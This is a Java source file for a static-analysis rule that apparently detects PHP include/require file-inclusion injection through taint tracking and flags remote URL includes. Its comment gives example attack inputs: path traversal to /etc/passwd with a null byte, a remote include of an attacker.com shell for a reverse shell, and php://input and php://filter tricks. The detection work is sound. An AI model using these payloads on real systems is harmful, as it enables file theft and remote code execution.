/**
 * checKing - Scorecard for software development processes
 * [C] Optimyth Software Technologies, 2009
 * Created by: lrodriguez Date: 4/29/13 6:41 PM
 */

package com.optimyth.qaking.rules.samples.php;

import com.als.core.RuleContext;
import com.als.core.ast.BaseNode;
import com.als.core.ast.NodeVisitor;
import com.als.core.ast.TreeNode;
import com.google.common.base.Predicate;
import com.optimyth.qaking.php.metadata.model.SinkDef;
import com.optimyth.qaking.php.rules.AbstractPhpTaintingRule;
import com.optimyth.qaking.php.rules.security.IncludeSinkChecker;
import com.optimyth.qaking.php.tainting.model.Sink;
import com.optimyth.qaking.php.tainting.model.SinkChecker;
import com.optimyth.qaking.php.util.CodeExtractor;
import com.optimyth.qaking.php.util.ConstantsUtil;
import es.als.util.StringUtils;

import java.util.List;
import java.util.regex.Pattern;

import static com.optimyth.qaking.php.metadata.TaintPredicates.getPredicate;

/**
 * IncludeFileInjectionRule - Sample rule that checks improper Control of filename for PHP include / require.
 * This sample rules is an example of tainting propagation in PHP.
 * <p/>
 * The PHP application receives input from an upstream component, but it does not restrict or incorrectly restricts the input
 * before its usage in include / include_once / require / require_once, or similar statements.
 * <p/>
 * The attacker may be able to specify arbitrary code to be executed from a remote location, by providing an URL.
 * It could also read PHP source or other local files. Alternatively, it may be possible to use normal program behaviour
 * to insert php code into files on the local machine which can then be included and force the code to execute,
 * since php ignores everything in the file except for the content between php specifiers.
 * <p/>
 * There are many attack avenues for this issue:
 * 1) Basic local file inclusion:
 * <code>include("includes/" . $_GET['file']);</code>
 * By providing <tt>file=.htaccess</tt> or <tt>file=../../var/lib/locate.db</tt>, attacker may see local files,
 * even out of the webapp directory.
 * By providing <tt>file=uploads/my_hacker_upload.php</tt>, the attacker may upload code that will be executed by PHP.
 * <p/>
 * 2) Limited local file inclusion:
 * <code>include("includes/" . $_GET['file'] . ".htm");</code>
 * The attacker may inject null byte and get rid of the appended extension (requires magic_quotes_gpc=on in php.ini)
 * <tt>file=../../../../../../../../../etc/passwd%00</tt>
 * <p/>
 * 3) Basic remote file inclusion:
 * include($_GET['file']);
 * By providing file=http://attacker.com/shell.php, the attacker may inject arbitrary code (e.g. get a reverse shell)
 * (Requires allow_url_fopen=On and allow_url_include=On in php.ini)
 * By providing file=php://input, the attacker could add payload in the POST data (like <?php phpinfo(); ?>), requires allow_url_include=On.
 * By providing file=php://filter/convert.base64-encode/resource=index.php, the attacker could read PHP code in webapp (or binary files...).
 * This is NOT restricted by allow_url_fopen or allow_url_include.
 * <p/>
 * As include statements that could be partially controlled by user input is very dangerous, it is recommended
 * to avoid dependency on any user-controlled input in the included resource, or at least use file neutralization functions
 * like basename() or pathinfo().
 * <p/>
 * NOTE: If the 'avoidUrlIncludes' is set to true, includes from a remote URL are also forbidden, as the remote server
 * could be compromised, and could return malicious code as attack vector against the analyzed software. Although since
 * PHP 5.2 URL includes are deactivated by default, allow_url_include could be enabled in the PHP configuration.
 * <p/>
 * This sample rule similar to standard com.optimyth.qaking.php.rules.security.IncludeFileInjectionRule in php rules jar.
 *
 * @author <a href="mailto:lrodriguez@optimyth.org">lrodriguez</a>
 * @version 29-04-2013
 */
public class IncludeFileInjection extends AbstractPhpTaintingRule {
  
  private static final Pattern URL_PATTERN = Pattern.compile("^https?\\://|^ftps?\\://");
  // SinkCheker that match include | include_once | require | require_once as include sinks
  private static final SinkChecker INCLUDE_CHECKER = new IncludeSinkChecker("include");

  private List<SinkChecker> checkers;
  private boolean avoidUrlIncludes = true;

  @Override public void initialize(RuleContext ctx) {
    super.initialize(ctx);
    //Create predicate that will match API functions resulting in file include
    Predicate<SinkDef> sinksPred = getPredicate("include");
    checkers = getSinkCheckers(sinksPred, ctx);
    checkers.add( INCLUDE_CHECKER );
    // with avoidUrlIncludes=true ANY include containing http:// or ftp:// URLs will be reported as violation,
    // even when argument is not tainted with external input.
    avoidUrlIncludes = getProperty("avoidUrlIncludes", true);
  }

  @Override protected void visit(BaseNode root, final RuleContext ctx) {
    // Normal tainting check, will find include / include_once / require / require_once with argument depending on external input
    propagateTainting(root, getSourcesPredicate(), checkers, ctx);
    
    if(avoidUrlIncludes) {
      // If this parameter is true, check also for URLs passed to include() and variants
      TreeNode.on(root).accept(new NodeVisitor() {
        public void visit(BaseNode node) {
          Sink sink = INCLUDE_CHECKER.check(node);
          if(sink != null) {
            for(TreeNode arg : INCLUDE_CHECKER.getTaintedArguments(sink)) {
              // Infer constant expression for include() argument
              String candidate = ConstantsUtil.eval(arg, "");
              if(StringUtils.hasText(candidate) && URL_PATTERN.matcher(candidate).find()) {
                // Report violation passing the URL matched in message
                String code = CodeExtractor.getCode(node, false);
                String msg = getMessage() + ": remote include from URL " + candidate;
                reportViolation(ctx, node, msg, code);
              }
            }
          }
        }
      });
    }
  }

}
